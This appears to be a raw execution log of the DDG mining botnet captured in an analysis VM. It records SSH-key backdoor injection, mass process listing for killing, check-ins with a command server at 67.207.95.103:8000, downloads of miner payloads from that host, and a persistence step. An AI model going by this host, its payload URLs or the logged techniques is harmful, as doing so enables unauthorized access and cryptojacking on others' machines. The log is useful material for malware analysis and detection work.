nohup: 忽略输入
I0615 12:27:41.691108   17737 backdoor.go:61] inject ssh key successfully
I0615 12:36:32.314356   17737 cmd_killer.go:49] /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
I0615 12:36:32.314476   17737 cmd_killer.go:49] /sbin/agetty --noclear tty1 linux
I0615 12:36:32.314776   17737 cmd_killer.go:49] lightdm --session-child 12 19
I0615 12:36:32.314895   17737 cmd_killer.go:49] /usr/lib/rtkit/rtkit-daemon
I0615 12:36:32.315289   17737 cmd_killer.go:49] /usr/lib/upower/upowerd
I0615 12:36:32.315408   17737 cmd_killer.go:49] /usr/lib/colord/colord
I0615 12:36:32.315530   17737 cmd_killer.go:49] /lib/systemd/systemd --user
I0615 12:36:32.315648   17737 cmd_killer.go:49] (sd-pam)
I0615 12:36:32.316552   17737 cmd_killer.go:49] /usr/bin/gnome-keyring-daemon --daemonize --login
I0615 12:36:32.316689   17737 cmd_killer.go:49] /sbin/upstart --user
I0615 12:36:32.316817   17737 cmd_killer.go:49] /usr/bin/VBoxClient --display
I0615 12:36:32.316935   17737 cmd_killer.go:49] /usr/bin/VBoxClient --display
I0615 12:36:32.317157   17737 cmd_killer.go:49] /usr/bin/VBoxClient --seamless
I0615 12:36:32.317276   17737 cmd_killer.go:49] upstart-udev-bridge --daemon --user
I0615 12:36:32.317398   17737 cmd_killer.go:49] dbus-daemon --fork --session --address=unix:abstract=/tmp/dbus-HUyAYIxVMy
I0615 12:36:32.317516   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/hud/window-stack-bridge
I0615 12:36:32.317761   17737 cmd_killer.go:49] upstart-dbus-bridge --daemon --system --user --bus-name system
I0615 12:36:32.317887   17737 cmd_killer.go:49] upstart-dbus-bridge --daemon --session --user --bus-name session
I0615 12:36:32.318334   17737 cmd_killer.go:49] upstart-file-bridge --daemon --user
I0615 12:36:32.318458   17737 cmd_killer.go:49] /usr/bin/fcitx
I0615 12:36:32.318576   17737 cmd_killer.go:49] /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --config-file /usr/share/fcitx/dbus/daemon.conf
I0615 12:36:32.318695   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/bamf/bamfdaemon
I0615 12:36:32.318926   17737 cmd_killer.go:49] /usr/bin/fcitx-dbus-watcher unix:abstract=/tmp/dbus-lFSqr653c0,guid=89d5f08134b26815394140b85ce4d4c4 1649
I0615 12:36:32.319602   17737 cmd_killer.go:49] /usr/lib/at-spi2-core/at-spi-bus-launcher
I0615 12:36:32.319726   17737 cmd_killer.go:49] /usr/bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
I0615 12:36:32.319845   17737 cmd_killer.go:49] /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
I0615 12:36:32.319965   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd
I0615 12:36:32.320189   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-fuse /run/user/0/gvfs -f -o big_writes
I0615 12:36:32.320308   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/notify-osd
I0615 12:36:32.320430   17737 cmd_killer.go:49] gpg-agent --homedir /root/.gnupg --use-standard-socket --daemon
I0615 12:36:32.320785   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/hud/hud-service
I0615 12:36:32.320905   17737 cmd_killer.go:49] /usr/lib/unity-settings-daemon/unity-settings-daemon
I0615 12:36:32.321023   17737 cmd_killer.go:49] /usr/lib/gnome-session/gnome-session-binary --session=ubuntu
I0615 12:36:32.321370   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/unity/unity-panel-service
I0615 12:36:32.321492   17737 cmd_killer.go:49] /usr/lib/dconf/dconf-service
I0615 12:36:32.321614   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-messages/indicator-messages-service
I0615 12:36:32.321970   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-bluetooth/indicator-bluetooth-service
I0615 12:36:32.323832   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-power/indicator-power-service
I0615 12:36:32.323909   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-datetime/indicator-datetime-service
I0615 12:36:32.324421   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-keyboard/indicator-keyboard-service --use-gtk
I0615 12:36:32.325024   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-sound/indicator-sound-service
I0615 12:36:32.325095   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-printers/indicator-printers-service
I0615 12:36:32.325162   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-session/indicator-session-service
I0615 12:36:32.325228   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-application/indicator-application-service
I0615 12:36:32.325307   17737 cmd_killer.go:49] /usr/lib/geoclue/geoclue-master
I0615 12:36:32.325376   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-source-registry
I0615 12:36:32.325723   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/ubuntu-geoip-provider
I0615 12:36:32.325796   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-calendar-factory
I0615 12:36:32.325865   17737 cmd_killer.go:49] /usr/lib/policykit-1-gnome/polkit-gnome-authentication-agent-1
I0615 12:36:32.326068   17737 cmd_killer.go:49] nm-applet
I0615 12:36:32.326309   17737 cmd_killer.go:49] /usr/lib/unity-settings-daemon/unity-fallback-mount-helper
I0615 12:36:32.326987   17737 cmd_killer.go:49] nautilus -n
I0615 12:36:32.328458   17737 cmd_killer.go:49] /usr/bin/gnome-software --gapplication-service
I0615 12:36:32.328532   17737 cmd_killer.go:49] compiz
I0615 12:36:32.328606   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-udisks2-volume-monitor
I0615 12:36:32.328674   17737 cmd_killer.go:49] /usr/lib/udisks2/udisksd --no-debug
I0615 12:36:32.328751   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-mtp-volume-monitor
I0615 12:36:32.328818   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-goa-volume-monitor
I0615 12:36:32.328884   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-afc-volume-monitor
I0615 12:36:32.329055   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-gphoto2-volume-monitor
I0615 12:36:32.329696   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-calendar-factory-subprocess --factory local --bus-name org.gnome.evolution.dataserver.Subprocess.Backend.Calendarx1982x2 --own-path /org/gnome/evolution/dataserver/Subprocess/Backend/Calendar/1982/2
I0615 12:36:32.333939   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-calendar-factory-subprocess --factory contacts --bus-name org.gnome.evolution.dataserver.Subprocess.Backend.Calendarx1982x3 --own-path /org/gnome/evolution/dataserver/Subprocess/Backend/Calendar/1982/3
I0615 12:36:32.334027   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-addressbook-factory
I0615 12:36:32.334099   17737 cmd_killer.go:49] fcitx-qimpanel
I0615 12:36:32.334173   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-addressbook-factory-subprocess --factory local --bus-name org.gnome.evolution.dataserver.Subprocess.Backend.AddressBookx2168x2 --own-path /org/gnome/evolution/dataserver/Subprocess/Backend/AddressBook/2168/2
I0615 12:36:32.334263   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-trash --spawner :1.7 /org/gtk/gvfs/exec_spaw/0
I0615 12:36:32.334325   17737 cmd_killer.go:49] 
I0615 12:36:32.334492   17737 cmd_killer.go:49] zeitgeist-datahub
I0615 12:36:32.334562   17737 cmd_killer.go:49] /bin/sh -c /usr/lib/i386-linux-gnu/zeitgeist/zeitgeist-maybe-vacuum; /usr/bin/zeitgeist-daemon
I0615 12:36:32.335088   17737 cmd_killer.go:49] /usr/bin/zeitgeist-daemon
I0615 12:36:32.335919   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/zeitgeist-fts
I0615 12:36:32.335993   17737 cmd_killer.go:49] /sbin/dhclient -d -q -sf /usr/lib/NetworkManager/nm-dhcp-helper -pf /var/run/dhclient-enp0s3.pid -lf /var/lib/NetworkManager/dhclient-60135289-a78e-332e-8738-3faf9606cf58-enp0s3.lease -cf /var/lib/NetworkManager/dhclient-enp0s3.conf enp0s3
I0615 12:36:32.336063   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/deja-dup/deja-dup-monitor
I0615 12:36:32.336134   17737 cmd_killer.go:49] deja-dup --prompt
I0615 12:36:32.336203   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-network --spawner :1.7 /org/gtk/gvfs/exec_spaw/1
I0615 12:36:32.336276   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-dnssd --spawner :1.7 /org/gtk/gvfs/exec_spaw/3
I0615 12:36:32.336656   17737 cmd_killer.go:49] bash
I0615 12:36:32.337153   17737 cmd_killer.go:49] /usr/lib/gnome-terminal/gnome-terminal-server
I0615 12:36:32.337268   17737 cmd_killer.go:49] bash
I0615 12:36:32.337381   17737 cmd_killer.go:49] /usr/bin/whoopsie -f
I0615 12:36:32.337484   17737 cmd_killer.go:49] 
I0615 12:36:32.338303   17737 cmd_killer.go:49] /usr/sbin/cupsd -l
I0615 12:36:32.338413   17737 cmd_killer.go:49] 
I0615 12:36:32.338525   17737 cmd_killer.go:49] /usr/lib/cups/notifier/dbus dbus://
I0615 12:36:32.338638   17737 cmd_killer.go:49] wireshark-gtk
I0615 12:36:32.338740   17737 cmd_killer.go:49] 
I0615 12:36:32.339041   17737 cmd_killer.go:49] 
I0615 12:36:32.339147   17737 cmd_killer.go:49] 
I0615 12:36:32.339251   17737 cmd_killer.go:49] 
I0615 12:36:32.339353   17737 cmd_killer.go:49] 
I0615 12:36:32.339525   17737 cmd_killer.go:49] 
I0615 12:36:32.339656   17737 cmd_killer.go:49] 
I0615 12:36:32.340161   17737 cmd_killer.go:49] 
I0615 12:36:32.340291   17737 cmd_killer.go:49] /usr/bin/dumpcap -n -i enp0s3 -y EN10MB -Z none
I0615 12:36:32.340402   17737 cmd_killer.go:49] ./ddgs_4005.i686 -log_dir /tmp/ -alsologtostderr -v 3
I0615 12:36:32.340505   17737 cmd_killer.go:49] 
I0615 12:36:32.341300   17737 cmd_killer.go:49] tail -f ddg.log
I0615 12:36:32.341416   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/unity-scope-home/unity-scope-home
I0615 12:36:32.341529   17737 cmd_killer.go:49] /usr/bin/unity-scope-loader applications/applications.scope applications/scopes.scope commands.scope
I0615 12:36:32.341641   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/unity-lens-files/unity-files-daemon
I0615 12:36:32.341753   17737 cmd_killer.go:49] auditd
I0615 12:36:32.341991   17737 cmd_killer.go:49] gdb asvfxg 25818
I0615 12:36:41.693936   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:36:41.694028   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:36:41.930429   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:36:41.930509   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:36:41.976691   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:36:41.978793   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:36:41.982196   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:36:41.983908   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:36:41.985585   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:36:51.693815   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:36:51.693878   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:36:51.693903   17737 report.go:46] empty baselist
I0615 12:36:51.926309   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:36:51.926952   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:36:51.930036   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:36:51.932990   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:36:51.935709   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:36:51.943048   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:36:51.951430   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:01.695679   17737 report.go:46] empty baselist
I0615 12:37:01.766925   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:37:01.767446   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:01.777733   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:01.779759   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:01.783907   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:01.785700   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:01.788463   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:11.693903   17737 report.go:46] empty baselist
I0615 12:37:11.727835   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:37:11.727937   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:11.732739   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:11.734463   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:11.735864   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:11.737384   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:11.739127   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:21.695823   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:37:21.695918   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:37:21.695958   17737 report.go:46] empty baselist
I0615 12:37:21.929560   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:37:21.931063   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:21.933572   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:21.936004   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:21.937805   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:21.939826   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:21.942898   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:31.698583   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:37:31.698691   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:37:31.698732   17737 report.go:46] empty baselist
I0615 12:37:31.934623   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:37:31.935634   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:31.938431   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:31.941459   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:31.944180   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:31.951108   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:31.959581   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:41.695542   17737 report.go:46] empty baselist
I0615 12:37:41.728127   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:37:41.728854   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:41.732147   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:41.734331   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:41.742831   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:41.749080   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:41.752218   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:51.695742   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:37:51.695837   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:37:51.695877   17737 report.go:46] empty baselist
I0615 12:37:51.930105   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:37:51.931022   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:51.934245   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:51.937174   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:51.939955   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:51.946701   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:37:51.956918   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:01.695598   17737 report.go:46] empty baselist
I0615 12:38:01.735099   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:38:01.735687   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:01.739640   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:01.741560   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:01.747797   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:01.751447   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:01.755190   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:11.701338   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:38:11.701417   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:38:11.701469   17737 report.go:46] empty baselist
I0615 12:38:11.848670   17737 miner.go:93] pid not exists {{/tmp/Donald /static/Donald 0f8c0d79ad9f258f8aa56c38968a18f0}}
I0615 12:38:11.858549   17737 miner.go:93] pid not exists {{/tmp/Trump /static/Trump ed3ddd57d2486b11e52a8ae4c8be8ace}}
I0615 12:38:11.942862   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:38:11.942934   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:11.944801   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:11.946610   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:11.949718   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:11.951266   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:11.953254   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:15.460278   17737 miner.go:101] fork/exec /tmp/Trump: exec format error: {XRun:{Exe:/tmp/Trump Url:http://67.207.95.103:8000/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}
I0615 12:38:21.698800   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:38:21.698870   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:38:21.698901   17737 report.go:46] empty baselist
I0615 12:38:21.929848   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:38:21.929924   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:21.947270   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:21.949419   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:21.951147   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:21.962231   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:21.965004   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:31.695024   17737 report.go:46] empty baselist
I0615 12:38:31.738786   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:38:31.750243   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:31.754217   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:31.756265   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:31.758476   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:31.761025   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:31.762877   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:41.693193   17737 main.go:110] try hub: 67.207.95.103:8000
I0615 12:38:41.693276   17737 main.go:33] pingpong: 67.207.95.103:8000
I0615 12:38:41.693303   17737 report.go:46] empty baselist
I0615 12:38:41.925953   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:38:41.926817   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:41.930338   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:41.933237   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:41.936057   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:41.938885   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:41.941217   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:51.694906   17737 report.go:46] empty baselist
I0615 12:38:51.742701   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:38:51.743898   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:51.746222   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:51.748002   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:51.749773   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:51.751891   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:38:51.753554   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:39:01.696021   17737 report.go:46] empty baselist
I0615 12:39:01.737477   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
I0615 12:39:01.737817   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:39:01.740866   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:39:01.742909   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:39:01.745359   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:39:01.747203   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:39:01.749003   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
I0615 12:39:11.694652   17737 report.go:46] empty baselist
I0615 12:39:11.710584   17737 utils.go:135] Persistence 1370 Node Successfully
